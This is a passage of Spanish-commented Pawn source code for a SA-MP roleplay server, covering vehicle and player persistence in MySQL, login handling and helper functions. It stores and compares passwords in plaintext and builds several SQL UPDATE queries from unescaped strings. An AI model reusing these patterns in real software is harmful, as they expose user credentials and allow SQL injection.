    for(new i = 0; i < sizeof(ObjectsInfo); i++)
  	{
  	    if(IsPlayerInRangeOfPoint(playerid, 2.0, ObjectsInfo[i][cpX], ObjectsInfo[i][cpY], ObjectsInfo[i][cpZ]))
        {
  	        if(ObjectsInfo[i][cpCreated] == 1)
            {
				ObjectsInfo[i][cpType]=0;
                ObjectsInfo[i][cpCreated]=0;
                ObjectsInfo[i][cpX]=0.0;
                ObjectsInfo[i][cpY]=0.0;
                ObjectsInfo[i][cpZ]=0.0;
                DestroyDynamicObject(ObjectsInfo[i][cpObject]);
                return 1;
  	        }
  	    }
  	}
    return 0;
}

encode_tires(tires1, tires2, tires3, tires4) //Pinchar ruedas
{
	return tires1 | (tires2 << 1) | (tires3 << 2) | (tires4 << 3);
}

forward NoRefAutoF(playerid);
public NoRefAutoF(playerid) //Deja de solicitar refuerzos
{
	if(SolicitaRefuerzos[playerid] == 0){return 1;}
	new string[128];
	SolicitaRefuerzos[playerid] = 0;
	format(string, sizeof(string), "[Radio] Central: El agente {FF0000}%s {02b1af}ya no solicita refuerzos.", GetPlayerNameRP(playerid));
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
			{
				SetPlayerMarkerForPlayer(i, playerid, Blanco2);
				SendClientMessage(i, AguamarinaOscuro, string);
			}
		}
	}
	SendClientMessage(playerid, AmarilloClaro, "Solicitud de refuerzos cancelada automáticamente.");
	return 1;
}

forward LoadCar(); //Cargar coches
public LoadCar()
{
    new Query[180], content[60], maletero[10], maleterocant[20];
	new ccount, conteo;
	new car = MAX_VEHPUBLICO+1;
	new sql[80], row[512];
 	format(sql, sizeof(sql), "SELECT SQLID FROM vehiculos ORDER BY SQLID DESC");
	mysql_query(1, sql);
	mysql_store_result();
	mysql_fetch_row(row);
	ccount = strval(row);

	for(new x=1; x<=ccount; x++)
	{
	    mysql_format(1, Query, sizeof(Query), "SELECT * FROM `vehiculos` WHERE `SQLID` = %d", x);
		mysql_query(1, Query);
		mysql_store_result();
		if(cache_get_field_content_int(0, "Llave") != 0 && cache_get_field_content_int(0, "Modelo") != 0)
		{
			CarInfo[car][cSQLID] = cache_get_field_content_int(0, "SQLID");
		 	CarInfo[car][cLlave] = cache_get_field_content_int(0, "Llave");
		 	CarInfo[car][cModelo] = cache_get_field_content_int(0, "Modelo");
		 	CarInfo[car][cPosX] = cache_get_field_content_float(0, "PosX");
		 	CarInfo[car][cPosY] = cache_get_field_content_float(0, "PosY");
		 	CarInfo[car][cPosZ] = cache_get_field_content_float(0, "PosZ");
		 	CarInfo[car][cZAngle] = cache_get_field_content_float(0, "ZAngle");
		 	CarInfo[car][cColor1] = cache_get_field_content_int(0, "Color1");
		 	CarInfo[car][cColor2] = cache_get_field_content_int(0, "Color2");
		 	CarInfo[car][cComprado] = cache_get_field_content_int(0, "Comprado");
		 	cache_get_field_content(0, "Dueno", content);
		    format(CarInfo[car][cDueno], 60, "%s", content);
            cache_get_field_content(0, "NombreModelo", content);
		    format(CarInfo[car][cNombreModelo], 60, "%s", content);
		    CarInfo[car][cValor] = cache_get_field_content_int(0, "Valor");
		    CarInfo[car][cCerrado] = cache_get_field_content_int(0, "Cerrado");
			CarInfo[car][cGas] = cache_get_field_content_int(0, "Gas");
			CarInfo[car][cEnDeposito] = cache_get_field_content_int(0, "EnDeposito");
			CarInfo[car][cMaxMaletero] = cache_get_field_content_int(0, "MaxMaletero");
			for(new a=0; a<CarInfo[car][cMaxMaletero]; a++)
		    {
		        format(maletero, sizeof(maletero), "Maletero%d", a+1);
		        format(maleterocant, sizeof(maleterocant), "MaleteroCant%d", a+1);
		        CarInfo[car][cMaletero][a] = cache_get_field_content_int(0, maletero);
		    	CarInfo[car][cMaleteroCant][a] = cache_get_field_content_int(0, maleterocant);
		    }
			CarInfo[car][cPanels] = cache_get_field_content_int(0, "Panels");
			CarInfo[car][cDoors] = cache_get_field_content_int(0, "Doors");
			CarInfo[car][cLights] = cache_get_field_content_int(0, "Lights");
			CarInfo[car][cTires] = cache_get_field_content_int(0, "Tires");
			CarInfo[car][cDamage] = cache_get_field_content_float(0, "Damage");
			CarInfo[car][cVirtualWorld] = cache_get_field_content_int(0, "VirtualWorld");
			CarInfo[car][cInterior] = cache_get_field_content_int(0, "Interior");
			if(CarInfo[car][cDamage] < 250){CarInfo[car][cDamage] = 250;}
			else if(CarInfo[car][cDamage] > 1000){CarInfo[car][cDamage] = 1000;}
				
			CarInfo[car][cID] = CreateVehicle(CarInfo[car][cModelo],CarInfo[car][cPosX],CarInfo[car][cPosY],CarInfo[car][cPosZ],CarInfo[car][cZAngle],CarInfo[car][cColor1],CarInfo[car][cColor2],600000);
			
			//CarInfo[car][cMaxMaletero] = EspaciosMaletero(GetVehicleModel(car));
			
			if(CarInfo[car][cEnDeposito] == 1) //Desgüace
			{
			    if(IsABoat(car)){SetVehiclePos(car, 2294.3999,-2447.8000,0.0000);}
		     	if(!IsABoat(car)){SetVehiclePos(car, 2274.1028,-2345.5371,13.5469);}
		    }
		    
		    UpdateVehicleDamageStatus(car, CarInfo[car][cPanels], CarInfo[car][cDoors], CarInfo[car][cLights], CarInfo[car][cTires]);
		    SetVehicleHealth(car, CarInfo[car][cDamage]);
		    SetVehicleVirtualWorld(car, CarInfo[car][cVirtualWorld]);
		    LinkVehicleToInteriorEx(car, CarInfo[car][cInterior]);
			if(CarInfo[car][cLlave] >= CodigoLlave){CodigoLlave = CarInfo[car][cLlave]+1;}
			conteo++;
			car ++;
		}
	}
	mysql_free_result();
	if(CodigoLlave < 1000){CodigoLlave = 1000;}
	printf("Coches cargados: %d", conteo);
	return 1;
}

forward SaveCar(idx); //Guardar coches -IMPORTANTE NO BORRAR NI UN SOLO VEHÍCULO DE LA DB-
public SaveCar(idx)
{
    if(CarInfo[idx][cLlave] != 0 && CarInfo[idx][cModelo] != 0)
    {
	    GetVehiclePos(idx, CarInfo[idx][cPosX], CarInfo[idx][cPosY], CarInfo[idx][cPosZ]);
	    GetVehicleZAngle(idx, CarInfo[idx][cZAngle]);
	    GetVehicleDamageStatus(idx, CarInfo[idx][cPanels], CarInfo[idx][cDoors], CarInfo[idx][cLights], CarInfo[idx][cTires]);
	    GetVehicleHealth(idx, CarInfo[idx][cDamage]);
	    CarInfo[idx][cVirtualWorld] = GetVehicleVirtualWorld(idx);
	    new sql[1024];
	    format(sql, 1024, "UPDATE vehiculos SET ID=%d,Llave=%d,Modelo=%d,PosX=%f,PosY=%f,PosZ=%f,ZAngle=%f,Color1=%d,Color2=%d,Comprado=%d,Dueno='%s',NombreModelo='%s',Valor=%d,Cerrado=%d,Gas=%d,EnDeposito=%d,MaxMaletero=%d WHERE SQLID=%d",
		CarInfo[idx][cID], //ID en SAMP
		CarInfo[idx][cLlave], //Llave del vehículo
		CarInfo[idx][cModelo], //Modelo del vehículo
		CarInfo[idx][cPosX], //Posición X
		CarInfo[idx][cPosY], //Posición Y
		CarInfo[idx][cPosZ], //Posición Z
		CarInfo[idx][cZAngle], //Ángulo
		CarInfo[idx][cColor1], //Color 1
		CarInfo[idx][cColor2], //Color 2
		CarInfo[idx][cComprado], //Si tiene propietario
		CarInfo[idx][cDueno], //Nombre del propietario
		CarInfo[idx][cNombreModelo], //Nombre del modelo
		CarInfo[idx][cValor], //Coste del vehículo
		CarInfo[idx][cCerrado], //Si está cerrado
		CarInfo[idx][cGas], //Combustible
		CarInfo[idx][cEnDeposito], //Si está en el depósito
		CarInfo[idx][cMaxMaletero], //Número de slots que el maletero podrá tener
		CarInfo[idx][cSQLID]); //ID en DB
		mysql_query(1, sql);
		
		for(new x=0; x<CarInfo[idx][cMaxMaletero]; x++)
		{
		    format(sql, 1024, "UPDATE vehiculos SET Maletero%d=%d,MaleteroCant%d=%d WHERE SQLID=%d",
		    x+1, CarInfo[idx][cMaletero][x], x+1, CarInfo[idx][cMaleteroCant][x],
			CarInfo[idx][cSQLID]);
			mysql_query(1, sql);
		}
		
		format(sql, 1024, "UPDATE vehiculos SET Panels=%d,Doors=%d,Lights=%d,Tires=%d,Damage=%f,VirtualWorld=%d,Interior=%d WHERE SQLID=%d",
		CarInfo[idx][cPanels], //Daño superficies
		CarInfo[idx][cDoors], //Daño puertas
		CarInfo[idx][cLights], //Daño luces
		CarInfo[idx][cTires], //Ruedas pinchadas
		CarInfo[idx][cDamage], //Daño del vehículo
		CarInfo[idx][cVirtualWorld],
		CarInfo[idx][cInterior],
		CarInfo[idx][cSQLID]);
		mysql_query(1, sql);
	}
	return 1;
}

stock CocheLSPD(carid) //Comprueba si el coche pertenece a LSPD
{
	if(carid >= 1 && carid <= 50) return 1;
	return 0;
}

stock CocheGOB(carid) //Comprueba si el coche pertenece al gobierno
{
	if(carid >= 51 && carid <= 54) return 1;
	return 0;
}

stock CocheLSN(carid) //Comprueba si el coche pertenece a LSN
{
	if(carid >= 55 && carid <= 57) return 1;
	return 0;
}

stock CocheAutoescuelaCond(carid) //Comprueba si el coche pertenece a la autoescuela de conducción
{
	if(carid >= 58 && carid <= 60) return 1;
	return 0;
}

stock CocheAutoescuelaAvion(carid) //Comprueba si el coche pertenece a la autoescuela de aviación
{
	if(carid == 61) return 1;
	return 0;
}

stock CocheAutoescuelaBarco(carid) //Comprueba si el coche pertenece a la autoescuela de navegación
{
	if(carid == 62) return 1;
	return 0;
}

stock IsAPizzaBike(carid) //Comprueba si es una moto de repartir pizza
{
	new M;
	M = GetVehicleModel(carid);
	if(M == 448)
	    return 1;
	return 0;
}

stock IsASweeper(carid) //Comprueba si es un barrendero
{
	new M;
	M = GetVehicleModel(carid);
	if(M == 574)
	    return 1;
	return 0;
}

stock IsASecuricar(carid) //Comprueba si es un securicar
{
	new M;
	M = GetVehicleModel(carid);
	if(M == 428)
	    return 1;
	return 0;
}

stock IsACombine(carid) //Comprueba si es una cosechadora
{
	new M;
	M = GetVehicleModel(carid);
	if(M == 532)
	    return 1;
	return 0;
}

stock IsACropduster(carid) //Comprueba si es avión fumigador
{
	new M;
	M = GetVehicleModel(carid);
	if(M == 512)
	    return 1;
	return 0;
}

stock IsATaxi(carid) //Comprueba si es un taxi
{
	new M;
	M = GetVehicleModel(carid);
	if(M == 420 || M == 438)
	    return 1;
	return 0;
}


stock IsABarcoPesca(carid) //Comprueba si es un barco de pesca
{
	if(carid == 87 || carid == 88)
	    return 1;
	return 0;
}

stock IsABike(carid) //Comprueba si es una bici
{
	new M;
	M = GetVehicleModel(carid);
	if(M == 510 || M == 481 || M == 509)
	    return 1;
	return 0;
}

stock IsAMBike(carid) //Comprueba si es una moto
{
	new M;
	M = GetVehicleModel(carid);
	if(M == 462 || M == 581 || M == 522 || M == 461 || M == 521 || M == 523 || M == 463 || M == 586 || M == 468 || M == 471)
	    return 1;
	return 0;
}

stock IsABoat(carid) //Comprueba si es un barco
{
	new M = GetVehicleModel(carid);
	if(M == 472 || M == 473 || M == 493 || M == 595 || M == 484 || M == 430 || M == 453 || M == 452 || M == 446 || M == 454){return 1;}
	return 0;
}

stock IsAPlane(carid) //Comprueba si es un avión o helicóptero
{
	new M =GetVehicleModel(carid);
	if(M == 592 || M == 577 || M == 511 || M == 548 || M == 512 || M == 593 || M == 425 || M == 417 || M == 487 || M == 553){return 1;}
	if(M == 488 || M == 497 || M == 563 || M == 476 || M == 447 || M == 519 || M == 460 || M == 469 || M == 513 || M == 520){return 1;}
	return 0;
}

stock LimpiarChat(playerid, lines) //Limpiar Chat
{
	if(IsPlayerConnected(playerid))
	{
		for(new i=0; i<lines; i++)
		{
			SendClientMessage(playerid, Gris, " ");
		}
	}
	return 1;
}

stock BanL(playerid) //Timer ban
{
    PlayerInfo[playerid][pBloqueado] = 1; PlayerSave(playerid);
    SetTimerEx("BanI", 200, false, "i", playerid);
}

stock KickL(playerid) //Timer kick
{
    SetTimerEx("KickI", 200, false, "i", playerid);
}

forward BanI(playerid); //Banea con timer
public BanI(playerid)
{
    Ban(playerid);
}

forward KickI(playerid); //Kickea con timer
public KickI(playerid)
{
    Kick(playerid);
}

stock ini_GetKey( line[] ) //Comprueba contraseña
{
	new keyRes[128];
	keyRes[0] = 0;
    if( strfind( line , "=" , true ) == -1 ) return keyRes;
    strmid( keyRes , line , 0 , strfind( line , "=" , true ) , sizeof( keyRes) );
    return keyRes;
}

stock ini_GetValue( line[] ) //Comprueba valores
{
	new valRes[128];
	valRes[0] = 0;
	if( strfind( line , "=" , true ) == -1 ) return valRes;
	strmid( valRes , line , strfind( line , "=" , true )+1 , strlen( line ) , sizeof( valRes ) );
	return valRes;
}

stock splitex(const strsrc[], strdest[][], delimiter) //Ni puta idea
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc)){
	    if(strsrc[i]==delimiter || i==strlen(strsrc)){
	        len = strmid(strdest[aNum], strsrc, li, i, 128);
	        strdest[aNum][len] = 0;
	        li = i+1;
	        aNum++;
		}
		i++;
	}
	return 1;
}

/*explode(const sSource[], aExplode[][], const sDelimiter[] = " ", iVertices = sizeof aExplode, iLength = sizeof aExplode[]) // Lo mismo
{
	new
		iNode,
		iPointer,
		iPrevious = -1,
		iDelimiter = strlen(sDelimiter);

	while(iNode < iVertices)
	{
		iPointer = strfind(sSource, sDelimiter, false, iPointer);

		if(iPointer == -1)
		{
			strmid(aExplode[iNode], sSource, iPrevious, strlen(sSource), iLength);
			break;
		}
		else
		{
			strmid(aExplode[iNode], sSource, iPrevious, iPointer, iLength);
		}

		iPrevious = (iPointer += iDelimiter);
		++iNode;
	}
	return iPrevious;
}*/

strtok(const string[], &index) //Ni puta idea
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}

	new offset = index;
	new result[20];
	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}

forward RandomWeather();
public RandomWeather()
{
	new rand = random(sizeof(TiempoAleatorioID));
	SetWeather(TiempoAleatorioID[rand][TiempoID]);
	DefaultWeather = TiempoAleatorioID[rand][TiempoID];
}

forward OnPlayerLogin(playerid,password[]); //Loguear
public OnPlayerLogin(playerid,password[])
{
    new EscapedText[60], Query[180], NombreUsuario[MAX_PLAYER_NAME];
    GetPlayerName(playerid, NombreUsuario, sizeof(NombreUsuario));
    mysql_real_escape_string(password, EscapedText);
    format(Query,sizeof(Query),"SELECT * FROM usuarios WHERE Nombre = '%s' AND Contra = '%s'",NombreUsuario,EscapedText);
    mysql_query(1, Query);
    mysql_store_result();
    if(cache_get_row_count() == 0)
    {
        new loginstring[128];
        format(loginstring,sizeof(loginstring),"Contraseña incorrecta, inténtalo de nuevo. \nRecuerda que serás baneado si la escribes mal 4 veces.");
        ShowPlayerDialog(playerid,0,DIALOG_STYLE_PASSWORD,"Nexus RP",loginstring,"Entrar","Salir");
        return 1;
    }
    mysql_free_result();
    
    PlayerLoad(playerid); //Carga variables
    
    if(PlayerInfo[playerid][pBloqueado] == 1) //BAN
    {
        SendClientMessage(playerid, Amarillo, "Esta cuenta está baneada. Puedes pedir su desbloqueo en el foro.");
        BanL(playerid);
    }
    if(PlayerInfo[playerid][pBloqueado] == 2) //CK
    {
        SendClientMessage(playerid, Amarillo, "Esta cuenta está bloqueada por CK. Puedes pedir su desbloqueo en el foro.");
        KickL(playerid);
    }
    
    if(PlayerInfo[playerid][pAdmin] > 0)
    {
	    format(Query, sizeof(Query), "Tienes nivel %d de admin.",PlayerInfo[playerid][pAdmin]);
    	SendClientMessage(playerid, Rojo,Query);
    }

    printf("%s ha logueado. (ID: %d)",NombreUsuario, playerid);
   	new plrIP[16];
    GetPlayerIp(playerid, plrIP, sizeof(plrIP));
    format(Query, sizeof(Query), "Usuario logueado: %s (ID: %d)", NombreUsuario, playerid);
    SendAdminMessage(AguamarinaOscuro, Query);
	format(Query, sizeof(Query), "[IP: %s]", plrIP);
    SendDuenoMessage(Rojo, Query);

    JugadorLogueado[playerid] = 1;
	new dinero = PlayerInfo[playerid][pDineroMano];
    GivePlayerMoneyAC(playerid, dinero);
	SpawnPlayer(playerid); //OnPlayerSpawn
	format(Query, sizeof(Query), "Nexus RP{FFFFFF} - Bienvenido al servidor, %s", GetPlayerNameRP(playerid));
	SendClientMessage(playerid, Amarillo, Query);
	return 1;
}

forward PlayerLoad(playerid);
public PlayerLoad(playerid)
{
	new Query[180], NombreUsuario[MAX_PLAYER_NAME], content[60];
    GetPlayerName(playerid, NombreUsuario, sizeof(NombreUsuario));
	mysql_format(1, Query, sizeof(Query), "SELECT * FROM `usuarios` WHERE `Nombre` = '%s'", NombreUsuario);
	mysql_query(1, Query);
	mysql_store_result();

	/*new row[256];
	new field[80][24];

	mysql_fetch_row_format(row, "|");
	explode(row, field, "|");
	mysql_free_result();*/
	
	
	//mysql_query(1, Query);

    cache_get_field_content(0, "Nombre", content);
    format(PlayerInfo[playerid][pNombre], sizeof(content), "%s", content);
    
	cache_get_field_content(0, "Contra", content);
	format(PlayerInfo[playerid][pContra], sizeof(content), "%s", content);
	
	PlayerInfo[playerid][pSQLID] = cache_get_field_content_int(0, "ID");
	
 	PlayerInfo[playerid][pAdmin] = cache_get_field_content_int(0, "Admin");
 	
 	cache_get_field_content(0, "AdminNombre", content);
 	format(PlayerInfo[playerid][pAdminNombre], sizeof(content), "%s", content);
 	
 	cache_get_field_content(0, "CuentaForo", content);
 	format(PlayerInfo[playerid][pCuentaForo], sizeof(content), "%s", content);
 	
 	PlayerInfo[playerid][pBloqueado] = cache_get_field_content_int(0, "Bloqueado");
 	PlayerInfo[playerid][pPrimerLogueo] = cache_get_field_content_int(0, "PrimerLogueo");
 	PlayerInfo[playerid][pPrimerLugarSpawn] = cache_get_field_content_int(0, "PrimerLugarSpawn");
 	PlayerInfo[playerid][pPrimeraMejora] = cache_get_field_content_int(0, "PrimeraMejora");
 	PlayerInfo[playerid][pEdad] = cache_get_field_content_int(0, "Edad");
 	PlayerInfo[playerid][pSexo] = cache_get_field_content_int(0, "Sexo");
 	PlayerInfo[playerid][pNivel] = cache_get_field_content_int(0, "Nivel");
 	PlayerInfo[playerid][pExp] = cache_get_field_content_int(0, "Exp");
    PlayerInfo[playerid][pVida] = cache_get_field_content_float(0, "Vida");
 	PlayerInfo[playerid][pChaleco] = cache_get_field_content_float(0, "Chaleco");
 	PlayerInfo[playerid][pTelefono] = cache_get_field_content_int(0, "Telefono");
 	PlayerInfo[playerid][pTrabajo] = cache_get_field_content_int(0, "Trabajo");
 	PlayerInfo[playerid][pContrato] = cache_get_field_content_int(0, "Contrato");
 	PlayerInfo[playerid][pEsperaTrabajar] = cache_get_field_content_int(0, "EsperaTrabajar");
 	PlayerInfo[playerid][pPosX] = cache_get_field_content_float(0, "PosX");
 	PlayerInfo[playerid][pPosY] = cache_get_field_content_float(0, "PosY");
 	PlayerInfo[playerid][pPosZ] = cache_get_field_content_float(0, "PosZ");
 	PlayerInfo[playerid][pDineroBanco] = cache_get_field_content_int(0, "DineroBanco");
 	PlayerInfo[playerid][pDineroMano] = cache_get_field_content_int(0, "DineroMano");
 	PlayerInfo[playerid][pEncarcelado] = cache_get_field_content_int(0, "Encarcelado");
    PlayerInfo[playerid][pTiempoCarcel] = cache_get_field_content_int(0, "TiempoCarcel");
    PlayerInfo[playerid][pAdvertencias] = cache_get_field_content_int(0, "Advertencias");
    PlayerInfo[playerid][pSkin] = cache_get_field_content_int(0, "Skin");
    PlayerInfo[playerid][pFaccion] = cache_get_field_content_int(0, "Faccion");
    PlayerInfo[playerid][pRango] = cache_get_field_content_int(0, "Rango");
    PlayerInfo[playerid][pLider] = cache_get_field_content_int(0, "Lider");
    PlayerInfo[playerid][pPuntosRol] = cache_get_field_content_int(0, "PuntosRol");
    PlayerInfo[playerid][pInterior] = cache_get_field_content_int(0, "Interior");
    PlayerInfo[playerid][pVirtualWorld] = cache_get_field_content_int(0, "VirtualWorld");
    PlayerInfo[playerid][pHabPistola] = cache_get_field_content_int(0, "HabPistola");
    PlayerInfo[playerid][pHabSD] = cache_get_field_content_int(0, "HabSD");
    PlayerInfo[playerid][pHabDEagle] = cache_get_field_content_int(0, "HabDEagle");
    PlayerInfo[playerid][pHabEscopeta] = cache_get_field_content_int(0, "HabEscopeta");
    PlayerInfo[playerid][pHabSawnoff] = cache_get_field_content_int(0, "HabSawnoff");
    PlayerInfo[playerid][pHabEscopetaCom] = cache_get_field_content_int(0, "HabEscopetaCom");
    PlayerInfo[playerid][pHabUZI] = cache_get_field_content_int(0, "HabUZI");
    PlayerInfo[playerid][pHabMP5] = cache_get_field_content_int(0, "HabMP5");
    PlayerInfo[playerid][pHabAK47] = cache_get_field_content_int(0, "HabAK47");
    PlayerInfo[playerid][pHabM4] = cache_get_field_content_int(0, "HabM4");
    PlayerInfo[playerid][pHabFranco] = cache_get_field_content_int(0, "HabFranco");
    PlayerInfo[playerid][pBol][0] = cache_get_field_content_int(0, "Bol0");
    PlayerInfo[playerid][pBol][1] = cache_get_field_content_int(0, "Bol1");
    PlayerInfo[playerid][pBol][2] = cache_get_field_content_int(0, "Bol2");
    PlayerInfo[playerid][pBol][3] = cache_get_field_content_int(0, "Bol3");
    PlayerInfo[playerid][pBol][4] = cache_get_field_content_int(0, "Bol4");
    PlayerInfo[playerid][pBol][5] = cache_get_field_content_int(0, "Bol5");
    PlayerInfo[playerid][pBol][6] = cache_get_field_content_int(0, "Bol6");
    PlayerInfo[playerid][pBol][7] = cache_get_field_content_int(0, "Bol7");
    PlayerInfo[playerid][pBolCant][0] = cache_get_field_content_int(0, "BolCant0");
    PlayerInfo[playerid][pBolCant][1] = cache_get_field_content_int(0, "BolCant1");
    PlayerInfo[playerid][pBolCant][2] = cache_get_field_content_int(0, "BolCant2");
    PlayerInfo[playerid][pBolCant][3] = cache_get_field_content_int(0, "BolCant3");
    PlayerInfo[playerid][pBolCant][4] = cache_get_field_content_int(0, "BolCant4");
    PlayerInfo[playerid][pBolCant][5] = cache_get_field_content_int(0, "BolCant5");
    PlayerInfo[playerid][pBolCant][6] = cache_get_field_content_int(0, "BolCant6");
    PlayerInfo[playerid][pBolCant][7] = cache_get_field_content_int(0, "BolCant7");
    PlayerInfo[playerid][pManoIzq] = cache_get_field_content_int(0, "ManoIzq");
    PlayerInfo[playerid][pManoIzqCant] = cache_get_field_content_int(0, "ManoIzqCant");
    PlayerInfo[playerid][pManoDer] = cache_get_field_content_int(0, "ManoDer");
    PlayerInfo[playerid][pManoDerCant] = cache_get_field_content_int(0, "ManoDerCant");
    PlayerInfo[playerid][pMuerto] = cache_get_field_content_int(0, "Muerto");
    PlayerInfo[playerid][pEspalda] = cache_get_field_content_int(0, "Espalda");
    PlayerInfo[playerid][pEspaldaCant] = cache_get_field_content_int(0, "EspaldaCant");
    PlayerInfo[playerid][pCint][0] = cache_get_field_content_int(0, "Cint0");
    PlayerInfo[playerid][pCint][1] = cache_get_field_content_int(0, "Cint1");
    PlayerInfo[playerid][pCint][2] = cache_get_field_content_int(0, "Cint2");
    PlayerInfo[playerid][pCint][3] = cache_get_field_content_int(0, "Cint3");
    PlayerInfo[playerid][pCint][4] = cache_get_field_content_int(0, "Cint4");
    PlayerInfo[playerid][pCint][5] = cache_get_field_content_int(0, "Cint5");
    PlayerInfo[playerid][pCint][6] = cache_get_field_content_int(0, "Cint6");
    PlayerInfo[playerid][pCint][7] = cache_get_field_content_int(0, "Cint7");
    PlayerInfo[playerid][pCintCant][0] = cache_get_field_content_int(0, "CintCant0");
    PlayerInfo[playerid][pCintCant][1] = cache_get_field_content_int(0, "CintCant1");
    PlayerInfo[playerid][pCintCant][2] = cache_get_field_content_int(0, "CintCant2");
    PlayerInfo[playerid][pCintCant][3] = cache_get_field_content_int(0, "CintCant3");
    PlayerInfo[playerid][pCintCant][4] = cache_get_field_content_int(0, "CintCant4");
    PlayerInfo[playerid][pCintCant][5] = cache_get_field_content_int(0, "CintCant5");
    PlayerInfo[playerid][pCintCant][6] = cache_get_field_content_int(0, "CintCant6");
    PlayerInfo[playerid][pCintCant][7] = cache_get_field_content_int(0, "CintCant7");
    PlayerInfo[playerid][pServicioPD] = cache_get_field_content_int(0, "ServicioPD");
    PlayerInfo[playerid][pLlaveCoche][0] = cache_get_field_content_int(0, "LlaveCoche0");
    PlayerInfo[playerid][pLlaveCoche][1] = cache_get_field_content_int(0, "LlaveCoche1");
    PlayerInfo[playerid][pLlaveCoche][2] = cache_get_field_content_int(0, "LlaveCoche2");
    PlayerInfo[playerid][pLlaveCoche][3] = cache_get_field_content_int(0, "LlaveCoche3");
    PlayerInfo[playerid][pLlaveCoche][4] = cache_get_field_content_int(0, "LlaveCoche4");
    PlayerInfo[playerid][pLlaveCochePrestado][0] = cache_get_field_content_int(0, "LlaveCochePrestado0");
    PlayerInfo[playerid][pLlaveCochePrestado][1] = cache_get_field_content_int(0, "LlaveCochePrestado1");
    PlayerInfo[playerid][pLlaveCochePrestado][2] = cache_get_field_content_int(0, "LlaveCochePrestado2");
    PlayerInfo[playerid][pLlaveCochePrestado][3] = cache_get_field_content_int(0, "LlaveCochePrestado3");
    PlayerInfo[playerid][pLlaveCochePrestado][4] = cache_get_field_content_int(0, "LlaveCochePrestado4");
    PlayerInfo[playerid][pMinPayDay] = cache_get_field_content_int(0, "MinPayDay");
    PlayerInfo[playerid][pLicConduccion] = cache_get_field_content_int(0, "LicConduccion");
	PlayerInfo[playerid][pLicNavegacion] = cache_get_field_content_int(0, "LicNavegacion");
	PlayerInfo[playerid][pLicAviacion] = cache_get_field_content_int(0, "LicAviacion");
	PlayerInfo[playerid][pLicArmas] = cache_get_field_content_int(0, "LicArmas");
	PlayerInfo[playerid][pLicPesca] = cache_get_field_content_int(0, "LicPesca");
	PlayerInfo[playerid][pLicCaza] = cache_get_field_content_int(0, "LicCaza");
	PlayerInfo[playerid][pCasa] = cache_get_field_content_int(0, "Casa");
	PlayerInfo[playerid][pCasaAlq] = cache_get_field_content_int(0, "CasaAlq");
    PlayerInfo[playerid][pNegocio] = cache_get_field_content_int(0, "Negocio");
    PlayerInfo[playerid][pTaller] = cache_get_field_content_int(0, "Taller");
    PlayerInfo[playerid][pHabMec] = cache_get_field_content_int(0, "HabMec");
    PlayerInfo[playerid][pHabLad] = cache_get_field_content_int(0, "HabLad");
    PlayerInfo[playerid][pTiempoRobo] = cache_get_field_content_int(0, "TiempoRobo");
    PlayerInfo[playerid][pHambre] = cache_get_field_content_int(0, "Hambre");
    PlayerInfo[playerid][pSed] = cache_get_field_content_int(0, "Sed");
    PlayerInfo[playerid][pAdiccion][0] = cache_get_field_content_int(0, "Adiccion0");
    PlayerInfo[playerid][pAdiccion][1] = cache_get_field_content_int(0, "Adiccion1");
    PlayerInfo[playerid][pAdiccion][2] = cache_get_field_content_int(0, "Adiccion2");
    PlayerInfo[playerid][pAdiccion][3] = cache_get_field_content_int(0, "Adiccion3");
    PlayerInfo[playerid][pAdiccion][4] = cache_get_field_content_int(0, "Adiccion4");
    PlayerInfo[playerid][pDrConsumida][0] = cache_get_field_content_int(0, "DrConsumida0");
    PlayerInfo[playerid][pDrConsumida][1] = cache_get_field_content_int(0, "DrConsumida1");
    PlayerInfo[playerid][pDrConsumida][2] = cache_get_field_content_int(0, "DrConsumida2");
    PlayerInfo[playerid][pDrConsumida][3] = cache_get_field_content_int(0, "DrConsumida3");
    PlayerInfo[playerid][pDrConsumida][4] = cache_get_field_content_int(0, "DrConsumida4");
    PlayerInfo[playerid][pFuerza] = cache_get_field_content_int(0, "Fuerza");
    PlayerInfo[playerid][pCansancioEntrenar] = cache_get_field_content_int(0, "CansancioEntrenar");
	mysql_free_result();
    return 1;
}

forward PlayerSave(playerid);
public PlayerSave(playerid)
{
    if(JugadorLogueado[playerid])
    {
    	ActualizarManos(playerid);
    	
        if(AdminDuty[playerid] == 0)
    	{
        	GetPlayerHealth(playerid,PlayerInfo[playerid][pVida]);
        	GetPlayerArmour(playerid,PlayerInfo[playerid][pChaleco]);
    	}

        new string[1200];
        format(string, sizeof(string), "UPDATE usuarios SET Contra = '%s', Admin = %d, AdminNombre = '%s', PrimerLogueo = %d, Edad = %d, Sexo = %d, Nivel = %d, Exp = %d, Vida = %f, Chaleco = %f, Telefono = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pContra], PlayerInfo[playerid][pAdmin], PlayerInfo[playerid][pAdminNombre], PlayerInfo[playerid][pPrimerLogueo],
    	PlayerInfo[playerid][pEdad], PlayerInfo[playerid][pSexo], PlayerInfo[playerid][pNivel],
        PlayerInfo[playerid][pExp], PlayerInfo[playerid][pVida], PlayerInfo[playerid][pChaleco], PlayerInfo[playerid][pTelefono], PlayerInfo[playerid][pNombre]);
    	mysql_query(1, string);

        if(GetPlayerState(playerid) != PLAYER_STATE_SPECTATING)
        {
            GetPlayerPos(playerid,PlayerInfo[playerid][pPosX],PlayerInfo[playerid][pPosY],PlayerInfo[playerid][pPosZ]);
        }

        PlayerInfo[playerid][pDineroMano] = GetPlayerMoney(playerid);

        format(string, sizeof(string), "UPDATE usuarios SET Trabajo = %d, Contrato = %d, EsperaTrabajar = %d, PosX = %f, PosY = %f, PosZ = %f, DineroBanco = %d, DineroMano = %d, Encarcelado = %d, TiempoCarcel = %d, Advertencias = %d, Skin = %d WHERE Nombre = '%s'",
    	PlayerInfo[playerid][pTrabajo], PlayerInfo[playerid][pContrato], PlayerInfo[playerid][pEsperaTrabajar], PlayerInfo[playerid][pPosX], PlayerInfo[playerid][pPosY], PlayerInfo[playerid][pPosZ],
    	PlayerInfo[playerid][pDineroBanco], PlayerInfo[playerid][pDineroMano], PlayerInfo[playerid][pEncarcelado],
